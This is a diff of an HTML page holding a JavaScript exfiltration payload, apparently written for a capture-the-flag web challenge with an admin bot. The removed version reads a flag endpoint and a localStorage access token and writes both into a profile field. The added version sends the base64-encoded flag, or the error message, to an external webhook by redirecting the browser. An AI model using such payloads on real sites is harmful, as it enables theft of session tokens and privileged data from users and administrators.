@@ -2,35 +2,24 @@
 <html>
 <body>
 <script>
-    async function solve() {
-        let flag = "Not Found";
-        let token = "No Token";
-
+    async function getTheFlag() {
+        const webhook = "https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";
+        
         try {
-            // 1. Try to get the flag
-            const fReq = await fetch('/api/admin/flag');
-            if(fReq.ok) flag = await fReq.text();
+            // 1. Fetch the flag from the most likely endpoint
+            const response = await fetch('/api/admin/flag');
+            const flag = await response.text();
+
+            // 2. Redirect the bot to your webhook WITH the flag in the URL
+            // This is a "Force-Leak" - even if fetch is blocked, a redirect usually works
+            window.location.href = webhook + "?flag=" + btoa(flag);
             
-            // 2. Try to get the session token
-            token = localStorage.getItem('accessToken') || "Not in LS";
-            
-            // 3. SAVE TO PROFILE (The "Notepad")
-            await fetch('/api/auth/profile', {
-                method: 'PATCH',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    "fullName": "DUMPING_DATA",
-                    "phoneNumber": flag.substring(0, 50),
-                    "address": {
-                        "street": token.substring(0, 50),
-                        "city": "Check_JSON_Now",
-                        "state": "LB"
-                    }
-                })
-            });
-        } catch (e) {}
+        } catch (e) {
+            // If the flag fetch fails, let's at least leak the error
+            window.location.href = webhook + "?error=" + btoa(e.message);
+        }
     }
-    solve();
+    getTheFlag();
 </script>
 </body>
 </html>
